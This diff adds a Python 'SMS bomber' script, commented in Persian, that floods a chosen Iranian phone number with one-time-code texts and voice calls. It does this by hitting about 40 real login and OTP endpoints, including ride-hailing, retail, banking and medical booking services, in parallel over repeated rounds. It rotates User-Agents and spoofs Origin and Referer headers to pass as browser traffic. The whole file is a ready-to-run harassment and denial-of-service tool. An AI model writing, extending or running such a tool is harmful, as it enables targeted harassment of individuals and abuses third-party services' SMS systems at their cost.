@@ -1,1 +1,283 @@
+# -*- coding: utf-8 -*-
+# Iranian SMS Bomber - for Pydroid 3
+# اجرا: فایل رو Run کن، شماره رو بدون 0 یا با 0 وارد کن
 
+import sys, time, random, threading
+from concurrent.futures import ThreadPoolExecutor, as_completed
+import requests
+
+TIMEOUT = 8
+
+UA = [
+    "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; Redmi Note 9S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
+]
+
+BASE_HEADERS = {
+    "Accept": "application/json, text/plain, */*",
+    "Accept-Language": "fa-IR,fa;q=0.9,en;q=0.8",
+}
+JSON_CT = {"Content-Type": "application/json"}
+FORM_CT = {"Content-Type": "application/x-www-form-urlencoded"}
+
+# ---------------------------------------------------------------- اندپوینت‌ها
+# {bare} = 9123456789   |   {local} = 09123456789
+# {intl} = +989123456789 |   {nocc}  = 989123456789
+ENDPOINTS = [
+    {"name": "Snapp",        "method": "POST", "url": "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",
+     "headers": dict(JSON_CT, Origin="https://app.snapp.taxi", Referer="https://app.snapp.taxi/"),
+     "json": {"cellphone": "{intl}"}},
+
+    {"name": "Divar",        "method": "POST", "url": "https://api.divar.ir/v5/auth/authenticate",
+     "headers": dict(JSON_CT, Origin="https://divar.ir", Referer="https://divar.ir/"),
+     "json": {"phone": "{local}"}},
+
+    {"name": "Digikala",     "method": "POST", "url": "https://api.digikala.com/v1/user/authenticate/",
+     "headers": dict(JSON_CT, Origin="https://www.digikala.com", Referer="https://www.digikala.com/"),
+     "json": {"username": "{local}"}},
+
+    {"name": "Basalam",      "method": "POST", "url": "https://auth.basalam.com/otp-request",
+     "headers": JSON_CT, "json": {"mobile": "{local}"}},
+
+    {"name": "Sheypoor",     "method": "POST", "url": "https://www.sheypoor.com/api/v10.0.0/auth/send",
+     "headers": dict(JSON_CT, Origin="https://www.sheypoor.com", Referer="https://www.sheypoor.com/"),
+     "json": {"username": "{local}"}},
+
+    {"name": "Alibaba",      "method": "POST", "url": "https://ws.alibaba.ir/api/v3/account/mobile/otp",
+     "headers": dict(JSON_CT, Origin="https://www.alibaba.ir"), "json": {"phoneNumber": "{intl}"}},
+
+    {"name": "Tapsi",        "method": "POST", "url": "https://api.tapsi.cab/api/v2/user",
+     "headers": dict(JSON_CT, Origin="https://tapsi.cab"),
+     "json": {"credential": {"phoneNumber": "{local}", "role": "PASSENGER"}}},
+
+    {"name": "Tapsi Driver", "method": "POST", "url": "https://api.tapsi.ir/api/v2.2/user",
+     "headers": dict(JSON_CT, Origin="https://tapsi.ir"),
+     "json": {"credential": {"phoneNumber": "{local}", "role": "DRIVER"}, "otpOption": "SMS"}},
+
+    {"name": "SnappFood",    "method": "POST", "url": "https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass",
+     "headers": dict(JSON_CT, Origin="https://snappfood.ir", Referer="https://snappfood.ir/"),
+     "json": {"cellphone": "{local}", "client": "PWA"}},
+
+    {"name": "Torob",        "method": "GET",  "url": "https://api.torob.com/a/phone/send-pin/",
+     "headers": {"Referer": "https://torob.com/"}, "params": {"phone_number": "{local}"}},
+
+    {"name": "Gap",          "method": "GET",  "url": "https://core.gap.im/v1/user/add.json",
+     "params": {"mobile": "{intl}"}},
+
+    {"name": "Nobat.ir",     "method": "POST", "url": "https://nobat.ir/api/public/patient/login/phone",
+     "headers": FORM_CT, "data": {"mobile": "{local}"}},
+
+    {"name": "DrDr",         "method": "POST", "url": "https://drdr.ir/api/registerEnrollment/sendDisposableCode",
+     "params": {"phoneNumber": "{intl}", "userType": "PATIENT"}},
+
+    {"name": "Banimode",     "method": "POST", "url": "https://mobapi.banimode.com/api/v2/auth/request",
+     "headers": JSON_CT, "json": {"phone": "{local}"}},
+
+    {"name": "Okala",        "method": "POST", "url": "https://api-react.okala.com/C/CustomerAccount/OTPRegister",
+     "headers": JSON_CT,
+     "json": {"mobile": "{local}", "deviceTypeCode": 0, "confirmTerms": True, "notRobot": False}},
+
+    {"name": "Khanoumi",     "method": "POST", "url": "https://www.khanoumi.com/accounts/sendotp",
+     "headers": dict(JSON_CT, Origin="https://www.khanoumi.com"), "json": {"mobile": "{local}"}},
+
+    {"name": "Namava",       "method": "POST", "url": "https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request",
+     "headers": JSON_CT, "json": {"UserName": "{local}"}},
+
+    {"name": "Virgool",      "method": "POST", "url": "https://virgool.io/api/v1.4/auth/verify",
+     "headers": JSON_CT, "json": {"method": "phone", "identifier": "{intl}"}},
+
+    {"name": "Taaghche",     "method": "POST", "url": "https://gw.taaghche.com/v4/site/auth/login",
+     "headers": dict(JSON_CT, Origin="https://taaghche.com", Referer="https://taaghche.com/"),
+     "json": {"contact": "{local}", "forceOtp": False}},
+
+    {"name": "Jabama",       "method": "POST", "url": "https://taraazws.jabama.com/api/v4/account/send-code",
+     "headers": dict(JSON_CT, Origin="https://jabama.com", Referer="https://jabama.com/"),
+     "json": {"mobile": "{local}"}},
+
+    {"name": "Miare",        "method": "POST", "url": "https://www.miare.ir/api/otp/driver/request/",
+     "headers": dict(JSON_CT, Origin="https://www.miare.ir"), "json": {"phone_number": "{local}"}},
+
+    {"name": "Alopeyk",      "method": "POST", "url": "https://api.alopeyk.com/api/v2/login?platform=pwa",
+     "headers": dict(JSON_CT, Origin="https://alopeyk.com"),
+     "json": {"type": "CUSTOMER", "phone": "{intl}"}},
+
+    {"name": "Lendo",        "method": "POST", "url": "https://api.lendo.ir/api/customer/auth/send-otp",
+     "headers": dict(JSON_CT, Origin="https://lendo.ir"), "json": {"mobile": "{local}"}},
+
+    {"name": "Bimebazar",    "method": "POST", "url": "https://bimebazar.com/accounts/api/login_sec/",
+     "headers": dict(JSON_CT, Origin="https://bimebazar.com"), "json": {"username": "{local}"}},
+
+    {"name": "Ghabzino",     "method": "POST",
+     "url": "https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode",
+     "headers": JSON_CT,
+     "json": {"Parameters": {"ApplicationType": "Web", "MobileNumber": "{local}"}}},
+
+    {"name": "Shad",         "method": "POST", "url": "https://shadmessenger12.iranlms.ir/",
+     "headers": JSON_CT,
+     "json": {"api_version": "3", "method": "sendCode",
+              "data": {"phone_number": "{local}", "send_type": "SMS"}}},
+
+    {"name": "Rubika",       "method": "POST", "url": "https://messengerg2c4.iranlms.ir/",
+     "headers": JSON_CT,
+     "json": {"api_version": "3", "method": "sendCode",
+              "data": {"phone_number": "{intl}", "send_type": "SMS"}}},
+
+    {"name": "Achareh",      "method": "POST", "url": "https://api.achareh.co/v2/accounts/login/",
+     "headers": dict(JSON_CT, Origin="https://achareh.co"), "json": {"phone": "{nocc}"}},
+
+    {"name": "Vandar",       "method": "POST", "url": "https://api.vandar.io/account/v1/check/mobile",
+     "headers": dict(JSON_CT, Origin="https://vandar.io"), "json": {"mobile": "{local}"}},
+
+    {"name": "Tetherland",   "method": "POST", "url": "https://service.tetherland.com/api/v5/login-register",
+     "headers": dict(JSON_CT, Origin="https://tetherland.com"), "json": {"mobile": "{local}"}},
+
+    {"name": "Pinorest",     "method": "POST", "url": "https://api.pinorest.com/frontend/auth/login/mobile",
+     "headers": dict(JSON_CT, Origin="https://pinorest.com"), "json": {"mobile": "{local}"}},
+
+    {"name": "Komodaa",      "method": "POST", "url": "https://api.komodaa.com/api/v2.6/loginRC/request",
+     "headers": dict(JSON_CT, Origin="https://komodaa.com"), "json": {"phone_number": "{local}"}},
+
+    {"name": "Mobit",        "method": "POST", "url": "https://api.mobit.ir/api/web/v8/register/register",
+     "headers": dict(JSON_CT, Origin="https://mobit.ir"), "json": {"number": "{local}"}},
+
+    {"name": "Timcheh",      "method": "POST", "url": "https://api.timcheh.com/auth/otp/send",
+     "headers": dict(JSON_CT, Origin="https://timcheh.com"), "json": {"mobile": "{local}"}},
+
+    {"name": "Football360",  "method": "POST", "url": "https://football360.ir/api/auth/verify-phone/",
+     "headers": dict(JSON_CT, Origin="https://football360.ir"), "json": {"phone_number": "{intl}"}},
+
+    {"name": "Bitpin",       "method": "POST", "url": "https://api.bitpin.ir/v1/usr/sub_phone/",
+     "headers": dict(JSON_CT, Origin="https://bitpin.ir"), "json": {"phone": "{local}"}},
+
+    {"name": "SnappDoctor",  "method": "GET",
+     "url": "https://core.snapp.doctor/Api/Common/v1/sendVerificationCode/{bare}/sms",
+     "params": {"cCode": "+98"}},
+
+    {"name": "Doctoreto",    "method": "GET",
+     "url": "https://api.doctoreto.com/api/web/patient/v1/accounts/register",
+     "params": {"mobile": "{intl}", "country_id": 205}},
+
+    {"name": "Fidibo",       "method": "POST", "url": "https://fidibo.com/user/login-by-sms",
+     "headers": dict(FORM_CT, Origin="https://fidibo.com", Referer="https://fidibo.com/"),
+     "data": "mobile_number={local}&country_code=ir"},
+
+    # این دو مورد «تماس صوتی» با کد هستند، نه پیامک
+    {"name": "Trip (تماس)",  "method": "POST", "url": "https://gateway.trip.ir/api/Totp",
+     "headers": dict(JSON_CT, Origin="https://trip.ir"), "json": {"PhoneNumber": "{local}"}},
+
+    {"name": "Paklean (تماس)", "method": "POST",
+     "url": "https://client.api.paklean.com/user/resendVoiceCode",
+     "headers": dict(JSON_CT, Origin="https://paklean.com"), "json": {"username": "{local}"}},
+]
+
+# ---------------------------------------------------------------- توابع کمکی
+def normalize(raw):
+    """ورودی 9123456789 یا 09123456789 یا +98912... → 9123456789"""
+    d = "".join(c for c in str(raw) if c.isdigit())
+    if d.startswith("0098"):
+        d = d[4:]
+    elif len(d) == 12 and d.startswith("98"):
+        d = d[2:]
+    d = d.lstrip("0")
+    if len(d) != 10 or not d.startswith("9"):
+        raise ValueError("شماره باید 10 رقم و با 9 شروع شود (مثال: 9123456789)")
+    return d
+
+
+def make_phones(bare):
+    return {
+        "bare": bare,
+        "local": "0" + bare,
+        "intl": "+98" + bare,
+        "nocc": "98" + bare,
+    }
+
+
+def fill(obj, ph):
+    if isinstance(obj, dict):
+        return {k: fill(v, ph) for k, v in obj.items()}
+    if isinstance(obj, list):
+        return [fill(v, ph) for v in obj]
+    if isinstance(obj, str):
+        return obj.format(**ph)
+    return obj
+
+
+def send_one(ep, ph, stop):
+    if stop.is_set():
+        return ep["name"], None, False
+    url = ep["url"].format(**ph)
+    headers = dict(BASE_HEADERS)
+    headers["User-Agent"] = random.choice(UA)
+    headers.update(ep.get("headers", {}))
+
+    kwargs = {"headers": headers, "timeout": TIMEOUT}
+    if "json" in ep:
+        kwargs["json"] = fill(ep["json"], ph)
+    if "data" in ep:
+        kwargs["data"] = fill(ep["data"], ph)
+    if "params" in ep:
+        kwargs["params"] = fill(ep["params"], ph)
+
+    try:
+        r = requests.request(ep.get("method", "POST"), url, **kwargs)
+        ok = r.status_code in (200, 201, 202, 204)
+        return ep["name"], r.status_code, ok
+    except Exception as e:
+        return ep["name"], type(e).__name__, False
+
+
+def main():
+    raw = sys.argv[1] if len(sys.argv) > 1 else input("شماره هدف (مثال 9123456789): ")
+    bare = normalize(raw)
+
+    rounds = sys.argv[2] if len(sys.argv) > 2 else input("چند دور ارسال؟ (هر دور ~40 پیامک): ")
+    rounds = max(1, int(rounds))
+
+    workers = sys.argv[3] if len(sys.argv) > 3 else input("تعداد ترد همزمان (پیشنهاد 20): ")
+    workers = max(1, min(int(workers), len(ENDPOINTS)))
+
+    delay_in = input("فاصله بین دورها به ثانیه (پیشنهاد 2): ").strip() or "2"
+    delay = float(delay_in)
+
+    ph = make_phones(bare)
+    stop = threading.Event()
+    total_ok = 0
+
+    print("\nهدف: {}  |  دورها: {}  |  ترد: {}  |  اندپوینت: {}".format(
+        ph["local"], rounds, workers, len(ENDPOINTS)))
+    print("-" * 46)
+
+    t0 = time.time()
+    try:
+        with ThreadPoolExecutor(max_workers=workers) as pool:
+            for rd in range(1, rounds + 1):
+                futures = [pool.submit(send_one, ep, ph, stop) for ep in ENDPOINTS]
+                ok = 0
+                failed = []
+                for f in as_completed(futures):
+                    name, code, success = f.result()
+                    if success:
+                        ok += 1
+                    else:
+                        failed.append("{}({})".format(name, code))
+                total_ok += ok
+                print("[دور {}/{}] موفق: {} از {} | مجموع: {}".format(
+                    rd, rounds, ok, len(ENDPOINTS), total_ok))
+                if failed:
+                    print("   رد شده: " + ", ".join(failed))
+                if rd < rounds:
+                    time.sleep(delay)
+    except KeyboardInterrupt:
+        stop.set()
+        print("\nمتوقف شد.")
+
+    print("-" * 46)
+    print("پایان. کل درخواست موفق: {} در {:.1f} ثانیه".format(total_ok, time.time() - t0))
+    print("اگر بعضی سرویس‌ها پیامک ندادن، معمولاً rate-limit یا تغییر API است.")
+
+
+if __name__ == "__main__":
+    main()
